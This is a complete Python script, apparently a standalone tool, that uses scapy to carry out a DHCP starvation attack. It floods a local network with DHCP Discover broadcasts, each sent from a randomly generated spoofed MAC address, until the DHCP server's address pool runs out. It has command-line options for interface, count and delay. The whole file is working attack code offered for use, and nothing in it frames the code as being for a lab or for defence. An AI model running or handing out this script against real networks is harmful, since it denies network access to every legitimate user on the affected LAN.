#!/bin/env python3

from scapy.all import *
import time
import random

def generate_random_mac():
    """Generate a random MAC address."""
    return ":".join(f"{random.randint(0x00, 0xff):02x}" for _ in range(6))

def dhcp_starvation(interface, count=0, delay=1):
    """
    Perform a DHCP starvation attack.
    :param interface: Network interface to use (e.g., 'eth0')
    :param count: Number of DHCP requests to send (0 for infinite)
    :param delay: Delay between requests in seconds
    """
    print(f"[*] Starting DHCP starvation attack on interface {interface}...")

    sent_packets = 0
    try:
        while True:
            # Generate a random MAC address for each request
            mac = generate_random_mac()
            
            # Craft DHCP Discover packet
            dhcp_discover = (
                Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")) + b"\x00" * 10) /
                DHCP(options=[("message-type", "discover"), "end"])
            )
            
            # Send the packet
            sendp(dhcp_discover, iface=interface, verbose=False)
            sent_packets += 1
            print(f"[+] Sent DHCP Discover packet #{sent_packets} with MAC: {mac}")
            
            # Stop if the count is reached
            if count > 0 and sent_packets >= count:
                break
            
            # Delay between requests
            time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[*] DHCP starvation attack stopped.")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="DHCP Starvation Attack Script")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of DHCP requests to send (0 for infinite)")
    parser.add_argument("-d", "--delay", type=float, default=1, help="Delay between requests in seconds")
    args = parser.parse_args()

    # Run the attack
    dhcp_starvation(args.interface, args.count, args.delay)
